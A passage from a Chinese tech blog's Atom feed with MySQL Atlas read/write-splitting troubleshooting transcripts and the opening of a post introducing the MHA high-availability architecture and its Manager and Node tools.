class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into book values(&apos;test&apos;, 67, 252);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>Master&#x68C0;&#x6D4B;&#x5230;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# tail -f /var/lib/mysql/rhel7.log</span><br><span class="line"></span><br><span class="line">2022-05-07T10:59:33.029685Z         4 Connect   root@192.168.73.20 on  using TCP/IP</span><br><span class="line">2022-05-07T10:59:33.030609Z         4 Query     SET CHARACTER_SET_CONNECTION=utf8</span><br><span class="line">2022-05-07T10:59:33.031735Z         4 Query     SET CHARACTER_SET_RESULTS=utf8</span><br><span class="line">2022-05-07T10:59:33.032656Z         4 Query     SET CHARACTER_SET_CLIENT=utf8</span><br><span class="line">2022-05-07T10:59:33.033919Z         4 Init DB   testdb</span><br><span class="line">2022-05-07T10:59:33.035018Z         4 Query     insert into book values(&apos;test&apos;, 67, 252)</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x6545;&#x969C;&#x89E3;&#x51B3;"><a href="#&#x6545;&#x969C;&#x89E3;&#x51B3;" class="headerlink" title="&#x6545;&#x969C;&#x89E3;&#x51B3;"></a>&#x6545;&#x969C;&#x89E3;&#x51B3;</h2><p><strong>&#x6545;&#x969C;&#x4E00;</strong></p><p><strong>Atlas</strong>&#x8BBF;&#x95EE;&#x5DE5;&#x4F5C;&#x63A5;&#x53E3;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x53EA;&#x6709;&#x4E00;&#x4E2A;<code>information_schema</code>&#xFF0C;&#x4E0D;&#x663E;&#x793A;&#x5176;&#x4ED6;&#x5E93;&#xFF1A;</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini mysql-proxy]# mysql -h192.168.73.21 -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 13</span><br><span class="line">Server version: 5.7.24-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; ^DBye</span><br></pre></td></tr></tbody></table></figure><p>&#x6545;&#x969C;&#x5206;&#x6790;&#xFF1A;</p><ol><li><p>&#x4E3B;&#x4ECE;&#x4E0D;&#x540C;&#x6B65;&#xFF1A;<br>&#x67E5;&#x770B;Slave&#x7684;&#x72B6;&#x6001;&#xFF1A;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Connecting to master</span><br><span class="line">                  Master_Host: 192.168.73.21</span><br><span class="line">                  Master_User: root</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 10</span><br><span class="line">              Master_Log_File: mysql-bin.000005</span><br><span class="line">          Read_Master_Log_Pos: 154</span><br><span class="line">               Relay_Log_File: rhel_sqlsrv-relay-bin.000012</span><br><span class="line">                Relay_Log_Pos: 4</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000005</span><br><span class="line">             Slave_IO_Running: Connecting</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">.........................................&#x7701;&#x7565;...................................................................</span><br><span class="line">        Seconds_Behind_Master: NULL</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 2003</span><br><span class="line">                Last_IO_Error: error connecting to master &apos;root@192.168.73.21:3306&apos; - retry-time: 10  retries: 1</span><br><span class="line"> .........................................&#x7701;&#x7565;...................................................................</span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>Atlas</code>&#x6CA1;&#x6709;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x4ECE;<br>&#x8BBF;&#x95EE;Atlas&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x662F;&#x5426;&#x90FD;&#x5728;&#x7EBF;</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini mysql-proxy]<span class="comment"># mysql -h127.0.0.1 -P2345 -uroot -ppwd</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.0.99-agent-admin</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &apos;<span class="keyword">help</span>;&apos; or &apos;\h&apos; for help. <span class="keyword">Type</span> <span class="string">&apos;\c&apos;</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> backends;</span><br><span class="line">+<span class="comment">-------------+--------------------+-------+------+</span></span><br><span class="line">| backend_ndx | address            | state | type |</span><br><span class="line">+<span class="comment">-------------+--------------------+-------+------+</span></span><br><span class="line">|           1 | 192.168.73.21:3306 | up    | rw   |</span><br><span class="line">|           2 | 192.168.73.22:3306 | down  | ro   |</span><br><span class="line">+<span class="comment">-------------+--------------------+-------+------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x6839;&#x636E;&#x5B9E;&#x9645;&#x73AF;&#x5883;&#x68C0;&#x67E5;&#xFF0C;&#x4E3B;&#x4ECE;&#x662F;&#x5426;&#x540C;&#x6B65;&#xFF0C;MySQL&#x662F;&#x5426;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7AEF;&#x53E3;&#x662F;&#x5426;&#x5F00;&#x653E;&#x3002;</p><p><strong>&#x6545;&#x969C;&#x4E8C;&#xFF1A;</strong></p><p>&#x6570;&#x636E;&#x5E93;&#x80FD;&#x591F;&#x67E5;&#x8BE2;&#xFF0C;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;</p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use testdb</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select * from book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">| Linux                   |    66 |   666 |</span><br><span class="line">| Unix                    |    77 |   777 |</span><br><span class="line">| abc                     |   123 |   456 |</span><br><span class="line">| def                     |    83 |   364 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">8 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`book`</span> <span class="keyword">values</span>(<span class="string">&apos;test&apos;</span>,<span class="number">24</span>,<span class="number">62</span>);</span><br><span class="line">ERROR 1046 (3D000): No database selected</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p>Master&#x65E5;&#x5FD7;&#xFF1A;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2022-05-07T09:24:33.993274Z        17 Query     insert into `book` values(&apos;test&apos;,24,62)</span><br><span class="line">2022-05-07T09:24:39.346670Z        17 Init DB   Access denied for user &apos;root&apos;@&apos;%&apos; to database &apos;testdb&apos;</span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>&#x91CD;&#x542F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MySQL-Atlas-&amp;#x2014;-&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79BB;&amp;#x5B9E;&amp;#x6218;&quot;&gt;&lt;a href=&quot;#MySQL-Atlas-&amp;#x2014;-&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79B
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL高可用集群架构-MHA架构</title>
    <link href="https://marnm.github.io//posts/db0340bd/"/>
    <id>https://marnm.github.io//posts/db0340bd/</id>
    <published>2022-06-07T04:45:20.000Z</published>
    <updated>2022-06-07T05:12:05.989Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;"><a href="#MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;" class="headerlink" title="MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;"></a>MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;</h1><p><strong>&#x7B80;&#x4ECB;&#xFF1A;</strong></p><p>MHA&#xFF08;Master High Availability&#xFF09;&#x76EE;&#x524D;&#x5728;MySQL&#x9AD8;&#x53EF;&#x7528;&#x65B9;&#x9762;&#x662F;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x6210;&#x719F;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x5B83;&#x7531;&#x65E5;&#x672C;DeNA&#x516C;&#x53F8;youshimaton&#xFF08;&#x73B0;&#x5C31;&#x804C;&#x4E8E;Facebook&#x516C;&#x53F8;&#xFF09;&#x5F00;&#x53D1;&#xFF0C;&#x662F;&#x4E00;&#x5957;&#x4F18;&#x79C0;&#x7684;&#x4F5C;&#x4E3A;MySQL&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x73AF;&#x5883;&#x4E0B;&#x6545;&#x969C;&#x5207;&#x6362;&#x548C;&#x4E3B;&#x4ECE;&#x63D0;&#x5347;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x8F6F;&#x4EF6;&#x3002;&#x5728;MySQL&#x6545;&#x969C;&#x5207;&#x6362;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x80FD;&#x505A;&#x5230;&#x5728;0~30&#x79D2;&#x4E4B;&#x5185;&#x81EA;&#x52A8;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6545;&#x969C;&#x5207;&#x6362;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x80FD;&#x5728;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x771F;&#x6B63;&#x610F;&#x4E49;&#x4E0A;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;</p><p>&#x8BE5;&#x8F6F;&#x4EF6;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF1A;MHA Manager&#xFF08;&#x7BA1;&#x7406;&#x8282;&#x70B9;&#xFF09;&#x548C;MHA Node&#xFF08;&#x6570;&#x636E;&#x8282;&#x70B9;&#xFF09;&#x3002;  </p><p>MHA Manager&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x90E8;&#x7F72;&#x5728;&#x4E00;&#x53F0;&#x72EC;&#x7ACB;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x7BA1;&#x7406;&#x591A;&#x4E2A;master-slave&#x96C6;&#x7FA4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x90E8;&#x7F72;&#x5728;&#x4E00;&#x53F0;slave&#x8282;&#x70B9;&#x4E0A;&#x3002;<br>MHA Node&#x8FD0;&#x884C;&#x5728;&#x6BCF;&#x53F0;MySQL&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;MHA Manager&#x4F1A;&#x5B9A;&#x65F6;&#x63A2;&#x6D4B;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;master&#x8282;&#x70B9;&#xFF0C;&#x5F53;master&#x51FA;&#x73B0;&#x6545;&#x969C;&#x65F6;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5C06;&#x6700;&#x65B0;&#x6570;&#x636E;&#x7684;slave&#x63D0;&#x5347;&#x4E3A;&#x65B0;&#x7684;master&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x7684;slave&#x91CD;&#x65B0;&#x6307;&#x5411;&#x65B0;&#x7684;master&#x3002;&#x6574;&#x4E2A;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x8FC7;&#x7A0B;&#x5BF9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5B8C;&#x5168;&#x900F;&#x660E;&#x3002;</p><p>&#x5728;MHA&#x81EA;&#x52A8;&#x6545;&#x969C;&#x5207;&#x6362;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x8BD5;&#x56FE;&#x4ECE;&#x5B95;&#x673A;&#x7684;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x7684;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E22;&#x5931;&#xFF0C;&#x4F46;&#x8FD9;&#x5E76;&#x4E0D;&#x603B;&#x662F;&#x53EF;&#x884C;&#x7684;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x786C;&#x4EF6;&#x6545;&#x969C;&#x6216;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;ssh&#x8BBF;&#x95EE;&#xFF0C;MHA&#x6CA1;&#x6CD5;&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x53EA;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x800C;&#x4E22;&#x5931;&#x4E86;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x3002;&#x4F7F;&#x7528;MySQL 5.5&#x7684;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x5927;&#x5927;&#x964D;&#x4F4E;&#x6570;&#x636E;&#x4E22;&#x5931;&#x7684;&#x98CE;&#x9669;&#x3002;MHA&#x53EF;&#x4EE5;&#x4E0E;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x3002;&#x5982;&#x679C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;slave&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;&#x6700;&#x65B0;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;MHA&#x53EF;&#x4EE5;&#x5C06;&#x6700;&#x65B0;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x5E94;&#x7528;&#x4E8E;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x7684;slave&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x3002;</p><p>&#x76EE;&#x524D;MHA&#x4E3B;&#x8981;&#x652F;&#x6301;&#x4E00;&#x4E3B;&#x591A;&#x4ECE;&#x7684;&#x67B6;&#x6784;&#xFF0C;&#x8981;&#x642D;&#x5EFA;MHA,&#x8981;&#x6C42;&#x4E00;&#x4E2A;&#x590D;&#x5236;&#x96C6;&#x7FA4;&#x4E2D;&#x5FC5;&#x987B;&#x6700;&#x5C11;&#x6709;&#x4E09;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x4E3B;&#x4E8C;&#x4ECE;&#xFF0C;&#x5373;&#x4E00;&#x53F0;&#x5145;&#x5F53;master&#xFF0C;&#x4E00;&#x53F0;&#x5145;&#x5F53;&#x5907;&#x7528;master&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x5145;&#x5F53;&#x4ECE;&#x5E93;&#xFF0C;&#x56E0;&#x4E3A;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x51FA;&#x4E8E;&#x673A;&#x5668;&#x6210;&#x672C;&#x7684;&#x8003;&#x8651;&#xFF0C;&#x6DD8;&#x5B9D;&#x4E5F;&#x5728;&#x8BE5;&#x57FA;&#x7840;&#x4E0A;&#x8FDB;&#x884C;&#x4E86;&#x6539;&#x9020;&#xFF0C;&#x76EE;&#x524D;&#x6DD8;&#x5B9D;TMHA&#x5DF2;&#x7ECF;&#x652F;&#x6301;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;&#x3002;MHA &#x9002;&#x5408;&#x4EFB;&#x4F55;&#x5B58;&#x50A8;&#x5F15;&#x64CE;, &#x53EA;&#x8981;&#x80FD;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5B83;&#x90FD;&#x652F;&#x6301;&#xFF0C;&#x4E0D;&#x9650;&#x4E8E;&#x652F;&#x6301;&#x4E8B;&#x7269;&#x7684; innodb &#x5F15;&#x64CE;&#x3002;</p><p>&#x5B98;&#x65B9;&#x4ECB;&#x7ECD;&#xFF1A;<a href="https://code.google.com/p/mysql-master-ha/" target="_blank" rel="noopener">https://code.google.com/p/mysql-master-ha/</a></p><p>&#x56FE;01&#x5C55;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x901A;&#x8FC7;MHA Manager&#x7BA1;&#x7406;&#x591A;&#x7EC4;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x3002;&#x53EF;&#x4EE5;&#x5C06;MHA&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x603B;&#x7ED3;&#x4E3A;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.85.188:8081/uploads/1652923038589086640mha_str.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>&#xFF08;1&#xFF09;&#x4ECE;&#x5B95;&#x673A;&#x5D29;&#x6E83;&#x7684;master&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#xFF08;binlog events&#xFF09;;</p><p>&#xFF08;2&#xFF09;&#x8BC6;&#x522B;&#x542B;&#x6709;&#x6700;&#x65B0;&#x66F4;&#x65B0;&#x7684;slave&#xFF1B;</p><p>&#xFF08;3&#xFF09;&#x5E94;&#x7528;&#x5DEE;&#x5F02;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF08;relay log&#xFF09;&#x5230;&#x5176;&#x4ED6;&#x7684;slave&#xFF1B;</p><p>&#xFF08;4&#xFF09;&#x5E94;&#x7528;&#x4ECE;master&#x4FDD;&#x5B58;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#xFF08;binlog events&#xFF09;&#xFF1B;</p><p>&#xFF08;5&#xFF09;&#x63D0;&#x5347;&#x4E00;&#x4E2A;slave&#x4E3A;&#x65B0;&#x7684;master&#xFF1B;</p><p>&#xFF08;6&#xFF09;&#x4F7F;&#x5176;&#x4ED6;&#x7684;slave&#x8FDE;&#x63A5;&#x65B0;&#x7684;master&#x8FDB;&#x884C;&#x590D;&#x5236;&#xFF1B;</p><p>MHA&#x8F6F;&#x4EF6;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;Manager&#x5DE5;&#x5177;&#x5305;&#x548C;Node&#x5DE5;&#x5177;&#x5305;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x8BF4;&#x660E;&#x5982;&#x4E0B;&#x3002;</p><p><strong>MHA Manager</strong>&#x5DE5;&#x5177;&#x5305;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;Manager&#x5DE5;&#x5177;&#x5305;&#x548C;Node&#x5DE5;&#x5177;&#x5305;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x8BF4;&#x660E;&#x5982;&#x4E0B;&#x3002;</p><p>Manager&#x5DE5;&#x5177;&#x5305;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A;</p><table><thead><tr><th><strong>&#x540D; &#x79F0;</strong></th><th><strong>&#x4F5C; &#x7528;</strong></th></tr></thead><tbody><tr><td>masterha_check_ssh</td><td>&#x68C0;&#x67E5;MHA&#x7684;SSH&#x914D;&#x7F6E;&#x72B6;&#x51B5;</td></tr><tr><td>masterha_check_repl</td><td>&#x68C0;&#x67E5;MySQL&#x590D;&#x5236;&#x72B6;&#x51B5;</td></tr><tr><td>masterha_manager</td><td>&#x542F;&#x52A8;MHA</td></tr><tr><td>masterha_check_status</td><td>&#x68C0;&#x6D4B;&#x5F53;&#x524D;MHA&#x8FD0;&#x884C;&#x72B6;&#x6001;</td></tr><tr><td>masterha_master_monitor</td><td>&#x68C0;&#x6D4B;master&#x662F;&#x5426;&#x5B95;&#x673A;</td></tr><tr><td>masterha_master_switch</td><td>&#x63A7;&#x5236;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#xFF08;&#x81EA;&#x52A8;&#x6216;&#x624B;&#x52A8;&#xFF09;</td></tr><tr><td>masterha_conf_host</td><td>&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x914D;&#x7F6E;&#x7684;server&#x4FE1;&#x606F;</td></tr></tbody></table><p><strong>MHA Node</strong>&#x5DE5;&#x5177;&#x5305;&#xFF08;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x901A;&#x5E38;&#x6709;MHA Manager&#x7684;&#x811A;&#x672C;&#x89E6;&#x53D1;&#xFF0C;&#x65E0;&#x9700;&#x4EBA;&#x4E3A;&#x64CD;&#x4F5C;&#xFF09;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A;</p><table><thead><tr><th><strong>&#x540D; &#x79F0;</strong></th><th><strong>&#x4F5C; &#x7528;</strong></th></tr></thead><tbody><tr><td>save_binary_logs</td><td>&#x4FDD;&#x5B58;&#x548C;&#x590D;&#x5236;master&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</td></tr><tr><td>apply_diff_relay_logs</td><td>&#x8BC6;&#x522B;&#x5DEE;&#x5F02;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#x5E76;&#x5C06;&#x5176;&#x5DEE;&#x5F02;&#x7684;&#x4E8B;&#x4EF6;&#x5E94;&#x7528;&#x4E8E;&#x5176;&#x4ED6;&#x7684;slave</td></tr><tr><td>filter_mysqlbinlog</td><td>&#x53BB;&#x9664;&#x4E0D;&#x5FC5;&#x8981;&#x7684;ROLLBACK&#x4E8B;&#x4EF6;&#xFF08;&#x5DF2;&#x5E9F;&#x5F03;&#xFF09;</td></tr><tr><td>purge_relay_logs</td><td>&#x6E05;&#x9664;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF08;&#x4E0D;&#x4F1A;&#x963B;&#x585E;SQL&#x7EBF;&#x7A0B;&#xFF09;</td></tr></tbody></table><p><em>&#x6CE8;&#x610F;&#xFF1A;</em><br>&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x51CF;&#x5C11;&#x4E3B;&#x5E93;&#x786C;&#x4EF6;&#x635F;&#x574F;&#x5B95;&#x673A;&#x9020;&#x6210;&#x7684;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x914D;&#x7F6E;MHA&#x7684;&#x540C;&#x65F6;&#x5EFA;&#x8BAE;&#x914D;&#x7F6E;&#x6210;MySQL 5.5&#x7684;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x3002;&#x5173;&#x4E8E;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x539F;&#x7406;&#x5404;&#x4F4D;&#x81EA;&#x5DF1;&#x8FDB;&#x884C;&#x67E5;&#x9605;&#x3002;&#xFF08;&#x4E0D;&#x662F;&#x5FC5;&#x987B;&#xFF09;</p><h2 